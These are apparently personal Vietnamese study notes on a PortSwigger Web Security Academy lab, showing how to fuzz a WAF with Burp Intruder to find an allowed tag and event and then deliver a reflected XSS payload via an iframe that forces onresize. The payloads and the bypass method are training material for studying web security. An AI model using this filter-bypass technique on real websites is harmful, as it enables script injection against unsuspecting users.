

![[Pasted image 20261021070228.png]]

==Bypass WAF== để chạy `print()` mà **không cần người dùng tương tác**.

**1. Thử payload cơ bản** — bị chặn:
```html
<img src=1 onerror=print()>
```

**2. ==Dò tag== được phép** — dùng Burp Intruder:
- Search term: `<§§>` (payload position giữa 2 ngoặc)
- Payload: **Copy tags to clipboard** từ XSS Cheat Sheet → Paste → Start attack
- Kết quả: chỉ **`body`** trả về 200, còn lại 400.
[[0-xss cheetsheet]]
**3. Dò event được phép** — tiếp tục Intruder:
- Search term: `<body%20§§=1>` (payload position trước dấu `=`)
- Payload: **Copy events to clipboard** → Paste → Start attack
- Kết quả: chỉ **`onresize`** trả về 200.

=> Ý chính
- WAF blacklist không đầy đủ → fuzz có hệ thống bằng Intruder để tìm tag/event lọt lưới.
- Thứ tự: **tìm tag trước → tìm event sau**.
- `onresize` không tự chạy → dùng iframe + đổi `width` trong `onload` để ép trigger.
payload 
```
<iframe src="https://0a60008d03209a42861585b9008400a6.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

![[Pasted image 20261021073121.png]]

![[Pasted image 20261021073308.png]]